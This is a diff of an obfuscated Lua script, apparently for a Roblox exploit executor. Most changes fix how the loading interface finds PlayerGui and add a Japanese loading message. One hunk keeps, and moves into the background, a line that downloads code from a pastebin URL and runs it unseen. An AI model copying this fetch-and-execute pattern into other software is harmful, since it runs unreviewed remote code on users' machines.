@@ -355,8 +355,10 @@ v2.v1115 = function(v57, v58)
     end
 
     if type(v2.SendNotify) ~= "function" then
-        pcall(function()
-            loadstring(game:HttpGet'pastebin.com/raw/3FcxYmYn')()
+        spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet'pastebin.com/raw/3FcxYmYn')()
+            end)
         end)
     end
 
@@ -1255,7 +1257,21 @@ local function v227()
     if not v241 then
         local v248 = v240:FindFirstChildOfClass("PlayerGui") or v240:FindFirstChild("PlayerGui")
         if not v248 then
-            v248 = v240:WaitForChild("PlayerGui")
+            local v249 = time()
+            while not v248 and time() - v249 < 5 do
+                pcall(function()
+                    v234.Heartbeat:Wait()
+                end)
+                v248 = v240:FindFirstChildOfClass("PlayerGui") or v240:FindFirstChild("PlayerGui")
+            end
+        end
+        if not v248 then
+            local v250, v251 = pcall(function()
+                return game:GetService("CoreGui")
+            end)
+            if v250 and v251 then
+                v248 = v251
+            end
         end
         v241 = v248
     end
@@ -1520,18 +1536,26 @@ local function v227()
     v298.loadingLabel.Font = Enum.Font.Code
     v298.loadingLabel.TextColor3 = Color3.new(1, 1, 1)
     v298.loadingLabel.TextSize = 16
-    v298.loadingLabel.Text = "Loading Stucked. Please wait..."
+do
+        local v1144 = "en"
+        if type(v1.v1131) == "function" then
+            local v1145 = v1.v1131()
+            if v1145 == "jp" then
+                v1144 = "jp"
+            end
+        end
+        v298.loadingLabel.Text = v1144 == "jp" and "ロードに時間がかかっています。少しお待ちください..." or "Loading Stucked. Please wait..."
+    end
     v298.loadingLabel.Active = false
     v298.loadingLabel.ZIndex = 2001
     v298.loadingLabel.Parent = v298.loadingBlock
 
-    delay(1.2, function()
+    delay(3, function()
         if v298.loadingBlock and v298.loadingBlock.Parent then
             v298.loadingBlock.Visible = true
         end
     end)
-
-    spawn(function()
+spawn(function()
         v307(v313)
     end)
     local v315 = 280
